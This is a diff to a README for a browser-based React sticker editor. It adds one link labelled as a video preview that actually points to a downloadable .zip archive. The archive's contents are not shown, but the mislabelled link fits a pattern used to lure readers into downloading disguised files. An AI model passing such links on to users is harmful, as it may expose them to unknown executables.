@@ -1,6 +1,7 @@
 # 🎨 React Sticker Canvas App
 
 A fun, browser-based sticker editor built with **React** and **react-konva**! Easily drag-and-drop stickers onto a canvas, rearrange them, delete them, and download your creation as a PNG image — all without a backend.
+[stickscape video preview](https://github.com/user-attachments/files/20638081/stickscape.video.preview.zip)
 
 ---
 
